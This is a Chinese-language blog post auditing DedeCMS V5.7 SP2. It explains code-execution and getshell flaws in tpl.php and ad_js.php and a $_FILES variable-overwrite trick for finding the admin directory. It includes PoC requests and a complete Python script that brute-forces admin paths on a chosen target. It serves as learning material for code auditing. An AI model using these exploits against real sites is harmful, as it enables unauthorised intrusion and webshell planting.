<!DOCTYPE html>
<html lang="zh-CN">
<head><meta name="generator" content="Hexo 3.9.0">
        <meta http-equiv="content-type" content="text/html; charset=utf-8">
    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
    <title>
        
            Dedecms V5.7 SP2代码审计
        
    </title>
    <link rel="icon" href="/img/favicon.png">
    <link rel="stylesheet" href="/css/style.css">
    <link rel="stylesheet" href="/css/font-awesome.min.css">
    <link rel="stylesheet" href="/css/gitment.css">
    <link rel="stylesheet" href="/css/hljs.min.css">
    <script src="/js/hljs.min.js"></script>  
    <script src="/js/gitment.browser.js"></script>  
</head>
<body>
    <header class="header" id="header">
    <h1>
        <a class="title" href="/">
            Hpdoger
        </a>
    </h1>
    <h2>
        <a class="motto">
            Ponyo loves Sōsuke!
        </a>
    </h2>
    <nav class="navbar">
        <ul class="menu">
            
            
                <li class="menu-item">
                    <a href="/" class="menu-item-link">
                        Home
                    </a>
                </li>
            
                
            
                <li class="menu-item">
                    <a href="/archives/" class="menu-item-link">
                        Archives
                    </a>
                </li>
            
                
            
                <li class="menu-item">
                    <a href="/about/" class="menu-item-link">
                        About
                    </a>
                </li>
            
                
            
                <li class="menu-item">
                    <a href="https://github.com/Hpd0ger" class="menu-item-link">
                        Github
                    </a>
                </li>
            
                
            
                <li class="menu-item">
                    <a href="/atom.xml" class="menu-item-link">
                        RSS
                    </a>
                </li>
            
                
            
                
                
                <li class="menu-item">
                    <a class="menu-item-link search">
                        Search                   
                        <i class="fa fa-long-arrow-right search-icon" aria-hidden="true"></i>
                    </a>
                        <input placeholder="Search..." class="search-input" style="display:none;border:none!important;" onkeydown="onEnter(event)" onkeypress="onEnter(event)">
                </li>
                
        </ul>
    </nav>
</header>
    <main class="main">
        <article class="post">
            <h1>
                <a class="title" href="/2018/08/21/Dedecms V5.7 SP2代码审计/"> 
                    Dedecms V5.7 SP2代码审计 
                </a>
            </h1>
            <div class="meta">
                <a class="date"> 
                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
                    2018-08-21   
                </a>
                
                <a class="category">
                    <i class="fa fa-th" aria-hidden="true"></i>  
                </a>
               
                <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/代码审计/">代码审计</a></li></ul>
                
                <a class="tag">
                    <i class="fa fa-tags" aria-hidden="true"></i>  
                </a>
                
                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/代码审计/">代码审计</a></li></ul>
            </div>
<div class="toc">
  <ol class="toc-list"><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#声明"><span class="toc-list-text">声明</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#索引"><span class="toc-list-text">索引</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#环境："><span class="toc-list-text">环境：</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#后台代码执行"><span class="toc-list-text">后台代码执行</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#漏洞描述"><span class="toc-list-text">漏洞描述</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#代码审计"><span class="toc-list-text">代码审计</span></a></li></ol></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#后台代码执行Getshell"><span class="toc-list-text">后台代码执行Getshell</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#代码审计-1"><span class="toc-list-text">代码审计</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#复现"><span class="toc-list-text">复现</span></a></li></ol></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#winapi查找后台目录"><span class="toc-list-text">winapi查找后台目录</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#利用条件"><span class="toc-list-text">利用条件</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#基础知识"><span class="toc-list-text">基础知识</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#审计"><span class="toc-list-text">审计</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#POC"><span class="toc-list-text">POC</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#最后穿插一个关于FILE变量的小知识点"><span class="toc-list-text">最后穿插一个关于FILE变量的小知识点</span></a></li></ol></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#相关链接"><span class="toc-list-text">相关链接</span></a></li></ol>
</div>
            <div class="content">
                <h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><p>首发于安全客：<a href="https://www.anquanke.com/post/id/157522" target="_blank" rel="noopener">代码审计入门级DedecmsV5.7 SP2分析复现</a></p>
<h2 id="索引"><a href="#索引" class="headerlink" title="索引"></a>索引</h2><p>Dedecms的洞有很多，而最新版的v5.7 sp2更新止步于1月。作为一个审计小白,看过《代码审计-企业级Web代码安全构架》后，偶然网上冲浪看到mochazz师傅在blog发的审计项目,十分有感触。跟着复现了两个dedecms代码执行的cve,以一个新手的视角重新审视这些代码，希望文章可以帮助像我这样入门审计不久的表哥们。文章若有片面或不足的地方还请师傅们多多斧正</p>
<h2 id="环境："><a href="#环境：" class="headerlink" title="环境："></a>环境：</h2><p>php5.45 + mysql<br>审计对象：DedeCMS V5.7 SP2<br>工具：seay源码审计</p>
<h2 id="后台代码执行"><a href="#后台代码执行" class="headerlink" title="后台代码执行"></a>后台代码执行</h2><h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>DedeCMS V5.7 SP2版本中tpl.php存在代码执行漏洞，攻击者可利用该漏洞在增加新的标签中上传木马，获取webshell</p>
<h3 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h3><p>漏洞位置：dede/tpl.php</p>
<p>看一下核心代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"># /dede/tpl.php</span><br><span class="line">&lt;?php</span><br><span class="line">require_once(dirname(__FILE__).&quot;/config.php&quot;);</span><br><span class="line">CheckPurview(&apos;plus_文件管理器&apos;);</span><br><span class="line"></span><br><span class="line">$action = isset($action) ? trim($action) : &apos;&apos;;</span><br><span class="line">......</span><br><span class="line">if(empty($filename))    $filename = &apos;&apos;;</span><br><span class="line">$filename = preg_replace(&quot;#[\/\\\\]#&quot;, &apos;&apos;, $filename);</span><br><span class="line">......</span><br><span class="line">else if($action==&apos;savetagfile&apos;)</span><br><span class="line">&#123;</span><br><span class="line">    csrf_check();</span><br><span class="line">    if(!preg_match(&quot;#^[a-z0-9_-]&#123;1,&#125;\.lib\.php$#i&quot;, $filename))</span><br><span class="line">    &#123;</span><br><span class="line">        ShowMsg(&apos;文件名不合法，不允许进行操作！&apos;, &apos;-1&apos;);</span><br><span class="line">        exit();</span><br><span class="line">    &#125;</span><br><span class="line">    require_once(DEDEINC.&apos;/oxwindow.class.php&apos;);</span><br><span class="line">    $tagname = preg_replace(&quot;#\.lib\.php$#i&quot;, &quot;&quot;, $filename);</span><br><span class="line">    $content = stripslashes($content);</span><br><span class="line">    $truefile = DEDEINC.&apos;/taglib/&apos;.$filename;</span><br><span class="line">    $fp = fopen($truefile, &apos;w&apos;);</span><br><span class="line">    fwrite($fp, $content);</span><br><span class="line">    fclose($fp);</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因为dedecms全局变量注册(register_globals=on)，这里有两个可控变量$filename&amp;$content</p>
<p>action=savetag时，进行csrf()检测</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function csrf_check()</span><br><span class="line">&#123;</span><br><span class="line">    global $token;</span><br><span class="line"></span><br><span class="line">    if(!isset($token) || strcasecmp($token, $_SESSION[&apos;token&apos;]) != 0)&#123;</span><br><span class="line">        echo &apos;&lt;a href=&quot;http://bbs.dedecms.com/907721.html&quot;&gt;DedeCMS:CSRF Token Check Failed!&lt;/a&gt;&apos;;</span><br><span class="line">        exit;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>验证token和已知的session是否相等，那么token的值从何获取呢？</p>
<p>回溯tpl.php，追踪一下token：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">else if ($action == &apos;upload&apos;)</span><br><span class="line">&#123;</span><br><span class="line">        ....</span><br><span class="line">        &lt;input name=&apos;acdir&apos; type=&apos;hidden&apos; value=&apos;$acdir&apos;  /&gt;</span><br><span class="line">        &lt;input name=&apos;token&apos; type=&apos;hidden&apos; value=&apos;&#123;$_SESSION[&apos;token&apos;]&#125;&apos;  /&gt;</span><br><span class="line">        &lt;input name=&apos;upfile&apos; type=&apos;file&apos; id=&apos;upfile&apos; style=&apos;width:380px&apos; /&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当action=upload时，隐藏表单的value提交token值<br><img src="https://s1.ax1x.com/2018/08/21/PIOS7n.png" alt></p>
<p>token搞定了，再让我们继续往下审~</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$truefile = DEDEINC.&apos;/taglib/&apos;.$filename;</span><br></pre></td></tr></table></figure>

<p>传入的filename必须为 xxxx.lib.php，并且保存的也是php文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fwrite($fp, $content);</span><br><span class="line">fclose($fp);</span><br></pre></td></tr></table></figure>

<p>写入内容为$content…那岂不是为所欲为..<br>poc:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/dedecms/uploads/dede/tpl.php?action=savetagfile&amp;filename=hpdoger.lib.php&amp;content=&lt;?php phpinfo();?&gt;&amp;token=55f2eb0ad241e1893276ed1f8e7dd5fa</span><br></pre></td></tr></table></figure>

<p>在include/taglib下会产生相应xxx.lib.php</p>
<h2 id="后台代码执行Getshell"><a href="#后台代码执行Getshell" class="headerlink" title="后台代码执行Getshell"></a>后台代码执行Getshell</h2><h3 id="代码审计-1"><a href="#代码审计-1" class="headerlink" title="代码审计"></a>代码审计</h3><p>问题代码位于：/uploads/plus/ad_js.php</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"> */</span><br><span class="line">require_once(dirname(__FILE__).&quot;/../include/common.inc.php&quot;);</span><br><span class="line"></span><br><span class="line">if(isset($arcID)) $aid = $arcID;</span><br><span class="line">$arcID = $aid = (isset($aid) &amp;&amp; is_numeric($aid)) ? $aid : 0;</span><br><span class="line">if($aid==0) die(&apos; Request Error! &apos;);</span><br><span class="line"></span><br><span class="line">$cacheFile = DEDEDATA.&apos;/cache/myad-&apos;.$aid.&apos;.htm&apos;;</span><br><span class="line">if( isset($nocache) || !file_exists($cacheFile) || time() - filemtime($cacheFile) &gt; $cfg_puccache_time )</span><br><span class="line">&#123;</span><br><span class="line">    $row = $dsql-&gt;GetOne(&quot;SELECT * FROM `#@__myad` WHERE aid=&apos;$aid&apos; &quot;);</span><br><span class="line">    $adbody = &apos;&apos;;</span><br><span class="line">    if($row[&apos;timeset&apos;]==0)</span><br><span class="line">    &#123;</span><br><span class="line">        $adbody = $row[&apos;normbody&apos;];</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        $ntime = time();</span><br><span class="line">        if($ntime &gt; $row[&apos;endtime&apos;] || $ntime &lt; $row[&apos;starttime&apos;]) &#123;</span><br><span class="line">            $adbody = $row[&apos;expbody&apos;];</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $adbody = $row[&apos;normbody&apos;];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $adbody = str_replace(&apos;&quot;&apos;, &apos;\&quot;&apos;,$adbody);</span><br><span class="line">    $adbody = str_replace(&quot;\r&quot;, &quot;\\r&quot;,$adbody);</span><br><span class="line">    $adbody = str_replace(&quot;\n&quot;, &quot;\\n&quot;,$adbody);</span><br><span class="line">    $adbody = &quot;&lt;!--\r\ndocument.write(\&quot;&#123;$adbody&#125;\&quot;);\r\n--&gt;\r\n&quot;;</span><br><span class="line">    $fp = fopen($cacheFile, &apos;w&apos;);</span><br><span class="line">    fwrite($fp, $adbody);</span><br><span class="line">    fclose($fp); </span><br><span class="line">&#125;</span><br><span class="line">include $cacheFile;</span><br></pre></td></tr></table></figure>

<p>摘出关键语句：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if( isset($nocache) || !file_exists($cacheFile) || time() - filemtime($cacheFile) &gt; $cfg_puccache_time )</span><br></pre></td></tr></table></figure>

<p>要求$nocache存在，又可以利用前面的全局变量注册</p>
<p>往下走Getone()函数进行sql查询，返回一个结果集。</p>
<p>而后把取到的值和当前的时间点对比作为判断条件，决定取表中的normbody还是exbody赋值给$adbody。</p>
<p>接着就比较明朗了..将$adbody写入文件，而文件名我们抓包应该就可以知道。</p>
<p>但是这里我只看了这一个文件，现在整理一下思路：<br>1、给出一个$aid进行sql查询<br>2、根据查询值判断\写文件，且文件内容可控，目录已知<br>3、最后把写入的文件包含进来。</p>
<p>那么，我们这个$aid从何处传入数据库呢？随着这个思路追踪文件到：/dede/ad_add.php</p>
<p>一个编辑页面，抓包看一下键值对应，顺便瞅一眼mysql载入的数据<br><img src="https://s1.ax1x.com/2018/08/22/PTGGdO.jpg" alt><br>看到这里知道，清楚exbody和normbody对应的都是什么了</p>
<p>依据代码<code>$row = $dsql-&gt;GetOne(&quot;SELECT * FROM `#@__myad` WHERE aid=&#39;$aid&#39; &quot;);</code>查看dede__myad这个库插入的内容：<br><img src="https://s1.ax1x.com/2018/08/22/PTGJoD.png" alt></p>
<p>看到timeset=0，那么直接是取<code>$adbody = $row[&#39;normbody&#39;];</code>其实timeset何时都为0，浏览ad_add.php代码部分看到，存入数据库的timeset值就为0</p>
<p>ok 现在思路明确,开始复现</p>
<h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><p>我们已经保存过一个页面了，直接poke一下<code>http://localhost/dedecms/uploads/plus/ad_js.php?aid=1</code>看看<br><img src="https://s1.ax1x.com/2018/08/22/PTGtFe.png" alt></p>
<p>查看写入文件：<code>http://localhost/dedecms/uploads/data/cache/myad-1.htm</code><br><img src="https://s1.ax1x.com/2018/08/22/PTGUWd.png" alt></p>
<p>htm文件成功写入，我们回到Ad_js来执行一下任意代码。不要忘记闭合前面的document文档注释语句<br>payload:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hpdoger=echo &apos;--&gt;&apos;; phpinfo();</span><br></pre></td></tr></table></figure>

<p><img src="https://s1.ax1x.com/2018/08/22/PTGwQI.jpg" alt></p>
<h2 id="winapi查找后台目录"><a href="#winapi查找后台目录" class="headerlink" title="winapi查找后台目录"></a>winapi查找后台目录</h2><h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><p>1、win系统下搭建的网站<br>2、网站后台目录存在/images/adminico.gif</p>
<h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><p>windows环境下查找文件基于Windows FindFirstFile的winapi函数，该函数到一个文件夹(包括子文件夹) 去搜索指定文件。</p>
<p>利用方法很简单，我们只要将文件名不可知部分之后的字符用“&lt;”或者“&gt;”代替即可，不过要注意的一点是，只使用一个“&lt;”或者“&gt;”则只能代表一个字符，如果文件名是12345或者更长，这时候请求“1&lt;”或者“1&gt;”都是访问不到文件的，需要“1&lt;&lt;”才能访问到，代表继续往下搜索，有点像Windows的短文件名，这样我们还可以通过这个方式来爆破目录文件了。</p>
<h3 id="审计"><a href="#审计" class="headerlink" title="审计"></a>审计</h3><p>核心文件：common.inc.php</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if($_FILES)</span><br><span class="line">&#123;</span><br><span class="line">    require_once(DEDEINC.&apos;/uploadsafe.inc.php&apos;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>追踪uploadsafe.inc.php</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">if( preg_match(&apos;#^(cfg_|GLOBALS)#&apos;, $_key) )</span><br><span class="line">&#123;</span><br><span class="line">    exit(&apos;Request var not allow for uploadsafe!&apos;);</span><br><span class="line">&#125;</span><br><span class="line">$$_key = $_FILES[$_key][&apos;tmp_name&apos;]; //获取temp_name </span><br><span class="line">$&#123;$_key.&apos;_name&apos;&#125; = $_FILES[$_key][&apos;name&apos;];</span><br><span class="line">$&#123;$_key.&apos;_type&apos;&#125; = $_FILES[$_key][&apos;type&apos;] = preg_replace(&apos;#[^0-9a-z\./]#i&apos;, &apos;&apos;, $_FILES[$_key][&apos;type&apos;]);</span><br><span class="line">$&#123;$_key.&apos;_size&apos;&#125; = $_FILES[$_key][&apos;size&apos;] = preg_replace(&apos;#[^0-9]#&apos;,&apos;&apos;,$_FILES[$_key][&apos;size&apos;]);</span><br><span class="line">if(!empty($&#123;$_key.&apos;_name&apos;&#125;) &amp;&amp; (preg_match(&quot;#\.(&quot;.$cfg_not_allowall.&quot;)$#i&quot;,$&#123;$_key.&apos;_name&apos;&#125;) || !preg_match(&quot;#\.#&quot;, $&#123;$_key.&apos;_name&apos;&#125;)) )</span><br><span class="line">&#123;</span><br><span class="line">    if(!defined(&apos;DEDEADMIN&apos;))</span><br><span class="line">    &#123;</span><br><span class="line">        exit(&apos;Not Admin Upload filetype not allow !&apos;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">if(empty($&#123;$_key.&apos;_size&apos;&#125;))</span><br><span class="line">&#123;</span><br><span class="line">    $&#123;$_key.&apos;_size&apos;&#125; = @filesize($$_key);</span><br><span class="line">&#125;</span><br><span class="line">$imtypes = array</span><br><span class="line">(</span><br><span class="line">    &quot;image/pjpeg&quot;, &quot;image/jpeg&quot;, &quot;image/gif&quot;, &quot;image/png&quot;, </span><br><span class="line">    &quot;image/xpng&quot;, &quot;image/wbmp&quot;, &quot;image/bmp&quot;</span><br><span class="line">);</span><br><span class="line">if(in_array(strtolower(trim($&#123;$_key.&apos;_type&apos;&#125;)), $imtypes))</span><br><span class="line">&#123;</span><br><span class="line">    $image_dd = @getimagesize($$_key); </span><br><span class="line">    //问题就在这里，获取文件的size，获取不到说明不是图片或者图片不存在，不存就exit upload.... ,利用这个逻辑猜目录的前提是目录内有图片格式的文件。</span><br><span class="line">    if (!is_array($image_dd))</span><br><span class="line">    &#123;</span><br><span class="line">        exit(&apos;Upload filetype not allow !&apos;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>摘出这句：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$image_dd = @getimagesize($$_key);</span><br></pre></td></tr></table></figure>

<p>进行判断$$_key是否为图片或图片是否存在</p>
<p>然而$$_key的来源是$_FILES[$_key][‘tmp_name’]，上文说了全局变量注册，$FILE可控，那我们传入一个$_FILES[$_key][‘tmp_name’]亦可控，此处是产生了一个变量覆盖的</p>
<p>接着再看同文件的代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$&#123;$_key.&apos;_name&apos;&#125; = $_FILES[$_key][&apos;name&apos;];</span><br><span class="line">$&#123;$_key.&apos;_type&apos;&#125; = $_FILES[$_key][&apos;type&apos;] = preg_replace(&apos;#[^0-9a-z\./]#i&apos;, &apos;&apos;, $_FILES[$_key][&apos;type&apos;]);</span><br><span class="line">$&#123;$_key.&apos;_size&apos;&#125; = $_FILES[$_key][&apos;size&apos;] = preg_replace(&apos;#[^0-9]#&apos;,&apos;&apos;,$_FILES[$_key][&apos;size&apos;]);</span><br><span class="line"></span><br><span class="line">if(!empty($&#123;$_key.&apos;_name&apos;&#125;) &amp;&amp; (preg_match(&quot;#\.(&quot;.$cfg_not_allowall.&quot;)$#i&quot;,$&#123;$_key.&apos;_name&apos;&#125;) || !preg_match(&quot;#\.#&quot;, $&#123;$_key.&apos;_name&apos;&#125;)) )</span><br><span class="line">&#123;</span><br><span class="line">    if(!defined(&apos;DEDEADMIN&apos;))</span><br><span class="line">    &#123;</span><br><span class="line">        exit(&apos;Not Admin Upload filetype not allow !&apos;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中,$cfg_not_allowall的范围如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$cfg_not_allowall = &quot;php|pl|cgi|asp|aspx|jsp|php3|shtm|shtml&quot;;</span><br></pre></td></tr></table></figure>

<p>既然上传的name不让以这些结尾，那么我们查.gif不过分吧</p>
<p>找一处验证以下这个核心文件产生的小漏洞：<br><img src="https://s1.ax1x.com/2018/08/21/PIOPhV.png" alt><br><img src="https://s1.ax1x.com/2018/08/21/PIOk1U.png" alt></p>
<h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_FILES[hpdoger][tmp_name]=./ded&lt;&lt;/images/adminico.gif&amp;_FILES[hpdoger][name]=0&amp;_FILES[hpdoger][size]=0&amp;_FILES[hpdoger][type]=image/gif</span><br></pre></td></tr></table></figure>

<p>这个poc根据mochazz师傅的poc练手写的，膜mochazz师傅~：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from itertools import permutations</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">def guess_back_dir(url,data,characters):</span><br><span class="line">    for num in range(1,5):</span><br><span class="line">        for every in permutations(characters,num):</span><br><span class="line">            payload = &apos;&apos;.join(every)</span><br><span class="line">            data[&quot;_FILES[hpdoger][tmp_name]&quot;] = data[&quot;_FILES[hpdoger][tmp_name]&quot;].format(p = payload)</span><br><span class="line">            print(&quot;testing:&quot;,payload)</span><br><span class="line">            r = requests.post(url,data = data)</span><br><span class="line">            if find_page(r) &gt; 0:</span><br><span class="line">                print(&quot;back_dir:[+]&quot;,payload)</span><br><span class="line">                data[&quot;_FILES[hpdoger][tmp_name]&quot;] = &quot;./&#123;p&#125;&lt;&lt;/images/adminico.gif&quot;</span><br><span class="line">                return payload</span><br><span class="line">            data[&quot;_FILES[hpdoger][tmp_name]&quot;] = &quot;./&#123;p&#125;&lt;&lt;/images/adminico.gif&quot;</span><br><span class="line"></span><br><span class="line">def guess_rest_dir(back_dir,url,data,characters):</span><br><span class="line">    while True:</span><br><span class="line">        for singel in characters:</span><br><span class="line">            if singel != characters[-1]:</span><br><span class="line">                data[&quot;_FILES[hpdoger][tmp_name]&quot;] = data[&quot;_FILES[hpdoger][tmp_name]&quot;].format(p=back_dir + singel)</span><br><span class="line">                r = requests.post(url,data = data)</span><br><span class="line">                # print data</span><br><span class="line">                if find_page(r) &gt; 0:</span><br><span class="line">                    print(&quot;guess successfully[+]:&quot;,back_dir)</span><br><span class="line">                    back_dir += singel</span><br><span class="line">                    data[&quot;_FILES[hpdoger][tmp_name]&quot;] = &quot;./&#123;p&#125;&lt;&lt;/images/adminico.gif&quot;</span><br><span class="line">                    break</span><br><span class="line">                data[&quot;_FILES[hpdoger][tmp_name]&quot;] = &quot;./&#123;p&#125;&lt;&lt;/images/adminico.gif&quot;</span><br><span class="line">            else:</span><br><span class="line">                return  back_dir</span><br><span class="line"></span><br><span class="line">def find_page(response):</span><br><span class="line">    if &quot;Upload filetype not allow !&quot; not in response.text and response.status_code == 200:</span><br><span class="line">        return 1</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    characters = &quot;abcdefghijklmnopqrstuvwxyz0123456789_!#&quot;</span><br><span class="line">    url = raw_input(&quot;Please input your target:&quot;)</span><br><span class="line">    data = &#123;</span><br><span class="line">        &quot;_FILES[hpdoger][tmp_name]&quot;: &quot;./&#123;p&#125;&lt;&lt;/images/adminico.gif&quot;,</span><br><span class="line">        &quot;_FILES[hpdoger][name]&quot;: 0,</span><br><span class="line">        &quot;_FILES[hpdoger][size]&quot;: 0,</span><br><span class="line">        &quot;_FILES[hpdoger][type]&quot;: &quot;image/gif&quot;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    back_dir = guess_back_dir(url,data,characters)</span><br><span class="line">    name = guess_rest_dir(back_dir,url,data,characters)</span><br><span class="line">    print(&quot;The background address is[+]:&quot;,name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<h3 id="最后穿插一个关于FILE变量的小知识点"><a href="#最后穿插一个关于FILE变量的小知识点" class="headerlink" title="最后穿插一个关于FILE变量的小知识点"></a>最后穿插一个关于FILE变量的小知识点</h3><p>$_FILES[“file”][“name”] - 被上传文件的名称<br>$_FILES[“file”][“type”] - 被上传文件的类型<br>$_FILES[“file”][“size”] - 被上传文件的大小，以字节计<br>$_FILES[“file”][“tmp_name”] - 存储在服务器的文件的临时副本的名称<br>$_FILES[“file”][“error”] - 由文件上传导致的错误代码</p>
